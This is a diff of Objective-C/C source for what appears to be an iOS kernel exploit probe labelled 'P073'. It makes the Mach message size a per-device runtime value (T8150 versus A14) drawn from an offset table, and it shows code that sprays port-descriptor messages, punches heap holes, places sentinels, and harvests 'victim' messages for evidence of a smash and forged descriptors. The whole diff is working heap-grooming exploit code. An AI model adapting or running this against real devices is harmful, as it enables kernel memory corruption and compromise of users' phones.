@@ -68,11 +68,16 @@
    tunes both without a rebuild: prefill = live portkind count placed
    fire-1 hop; burst = the fresh-small census load count (0 for the pure
    conversion round). */
-#define P073_BUILD @"p073-second-table-v11-reader-fix"
+#define P073_BUILD @"p073-second-table-v12-runclass"
 
-/* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class) */
+/* kmsg geometry — P034 contract: msgh_size 0x7FC -> kdata 0x820 (ANE class).
+   v12: the class is RUNTIME — T8150's record law = 0x10b8 (notes 251/265,
+   0x10a0 cleared + 0x18) -> msgh 0x1094 by the same +0x24 law (mark
+   VERIFY per-run). A14's 0x7FC/0x820 stays the default. */
 #define P073_MSG_SIZE     0x7FCu
 #define P073_KDATA_SIZE   (P073_MSG_SIZE + 0x24u)
+#define P073_BUF_MAX      0x1600u   /* stack buffers: max class + margin */
+static uint32_t g_p073_msgSize;   /* msgh bytes; derived per-SKU at tap start */
 #define P073_N_HOLES      256u   /* v8: consecutive PORTKIND descs, ALL punched (LIFO) */
 #define P073_N_SENT       64u    /* live sentinels before AND after holes */
 #define P073_MAGIC        0x50730000u  /* "P073" */
@@ -345,19 +350,19 @@ static mach_port_t p073_make_port(void) {
 }
 
 static BOOL p073_send_simple(mach_port_t port, uint32_t index) {
-    uint8_t buf[P073_MSG_SIZE];
-    memset(buf, 0xA5, sizeof(buf));
+    uint8_t buf[P073_BUF_MAX];
+    memset(buf, 0xA5, g_p073_msgSize);
     uint8_t *body = buf + sizeof(mach_msg_header_t);
     memcpy(body, "P073", 4);
     uint32_t tag = index ^ P073_MAGIC;
     memcpy(body + 4, &tag, 4);
     mach_msg_header_t *h = (mach_msg_header_t *)buf;
     h->msgh_bits        = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
-    h->msgh_size        = P073_MSG_SIZE;
+    h->msgh_size        = g_p073_msgSize;
     h->msgh_remote_port = port;
     h->msgh_local_port  = MACH_PORT_NULL;
     h->msgh_id          = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
-    return mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
+    return mach_msg(h, MACH_SEND_MSG, g_p073_msgSize, 0,
                     MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL) == MACH_MSG_SUCCESS;
 }
 
@@ -379,8 +384,8 @@ static BOOL p073_send_simple(mach_port_t port, uint32_t index) {
 #define P073_PORT_BODY_OFF (sizeof(mach_msg_header_t) + sizeof(mach_msg_body_t))
 
 static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
-    uint8_t buf[P073_MSG_SIZE];
-    memset(buf, 0xA5, sizeof(buf));
+    uint8_t buf[P073_BUF_MAX];
+    memset(buf, 0xA5, g_p073_msgSize);
     mach_msg_header_t *h = (mach_msg_header_t *)buf;
     mach_msg_body_t *b = (mach_msg_body_t *)(buf + sizeof(mach_msg_header_t));
     b->msgh_descriptor_count = P073_N_DESC;
@@ -405,11 +410,11 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
     uint32_t tag = index ^ P073_MAGIC;
     memcpy(payload + 8, &tag, 4);
     h->msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
-    h->msgh_size = P073_MSG_SIZE;
+    h->msgh_size = g_p073_msgSize;
     h->msgh_remote_port = port;
     h->msgh_local_port = MACH_PORT_NULL;
     h->msgh_id = (int)(P073_MAGIC | (int)(index & 0xFFFFu));
-    mach_msg_return_t mr = mach_msg(h, MACH_SEND_MSG, P073_MSG_SIZE, 0,
+    mach_msg_return_t mr = mach_msg(h, MACH_SEND_MSG, g_p073_msgSize, 0,
                     MACH_PORT_NULL, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
     /* the send consumed the desc rights (COPY_SEND); release caller copies */
     for (uint32_t i = 0; i < P073_N_DESC; i++) {
@@ -428,7 +433,7 @@ static BOOL p073_send_portkind(mach_port_t port, uint32_t index) {
 /* recv one port-kind victim; -1 = processed with evidence (smash seen),
     0 = gone/timeout, 1 = clean */
 static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut, const char *label) {
-    uint8_t rbuf[P073_MSG_SIZE + 0x300];
+    uint8_t rbuf[P073_BUF_MAX];
     memset(rbuf, 0, sizeof(rbuf));
     mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
     mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
@@ -509,7 +514,7 @@ static int p073_harvest_portkind(p073_held_t *v, uint32_t *descForgeOut, const c
    v11: unused after the sentPre reader fix (kept for the OOL-harness
    round-trip work). */
 __attribute__((unused)) static int p073_harvest_one(p073_held_t *v, const char *label) {
-    uint8_t rbuf[P073_MSG_SIZE + 64];
+    uint8_t rbuf[P073_BUF_MAX];
     memset(rbuf, 0, sizeof(rbuf));
     mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
     mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
@@ -605,6 +610,20 @@ static NSURL *p073_model_url(NSString *name) {
         } else if (!off) {
             p073_log(@"EXPECT-BAD LabOff NULL. Probe still fires.");
         }
+    }
+
+    /* v12: runtime kmsg class (P034 +0x24 law, notes 251/265 record law) */
+    g_p073_msgSize = P073_MSG_SIZE;
+    {
+        const LabOffTab *offT = LabOff();
+        uint32_t kdata = (offT && offT->ane_table_size >= 0x300
+                          && offT->ane_table_size <= 0x4000)
+                         ? offT->ane_table_size : P073_KDATA_SIZE;
+        g_p073_msgSize = kdata - 0x24u;
+        if (g_p073_msgSize != P073_MSG_SIZE)
+            p073_log(@"[v12] runtime kmsg class: kdata=0x%x -> msgh=0x%x "
+                     @"(T8150 0x10b8 record law; VERIFY: adjacency now in the 0x10b8 zone)",
+                     kdata, g_p073_msgSize);
     }
 
     /* ---- anchor (informational; aio84530 heap leak recorded by P063) ---- */
@@ -856,7 +875,7 @@ static NSURL *p073_model_url(NSString *name) {
     {
         uint32_t punched = 0;
         for (uint32_t i = 0; i < nHoles; i++) {
-            uint8_t rbuf[P073_MSG_SIZE + 64];
+            uint8_t rbuf[P073_BUF_MAX];
             memset(rbuf, 0, sizeof(rbuf));
             mach_msg_header_t *h = (mach_msg_header_t *)rbuf;
             mach_msg_return_t mr = mach_msg(h, MACH_RCV_MSG | MACH_RCV_TIMEOUT, 0,
